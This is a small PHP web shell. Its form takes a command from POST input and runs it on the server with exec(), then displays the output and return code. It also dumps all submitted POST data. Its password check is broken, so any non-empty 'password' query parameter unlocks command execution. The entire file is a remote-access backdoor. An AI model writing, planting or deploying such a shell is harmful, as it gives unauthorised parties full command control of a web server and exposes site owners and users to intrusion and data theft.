<?php
/**
 * Date: 1/27/21
 * Time: 5:43 PM
 */


echo '<pre>';
print_r( $_POST );
echo '</pre>';

$pass = md5( 'techvsi' );
if ( empty( $_GET['password'] ) && $pass != $_GET['password'] ) {
	return;
}
$res = 'nothing';
if ( ! empty( $_POST['command'] ) ) {
	exec( $_POST['command'], $output, $res );
}
?>

<form method="post" action="<?php echo $_SERVER['REQUEST_URI'] ?>">
    <label for="command">Command</label><br>
    <input type="text" id="command" name="command" value=""><br>
    <br>
    <input type="submit" value="Submit">
    <p>Return:</p>
	<?php
	echo '<pre>';
	print_r( $res );
	echo '</pre>';
	echo '<pre>';
	print_r( $output );
	echo '</pre>';
	?>
</form>




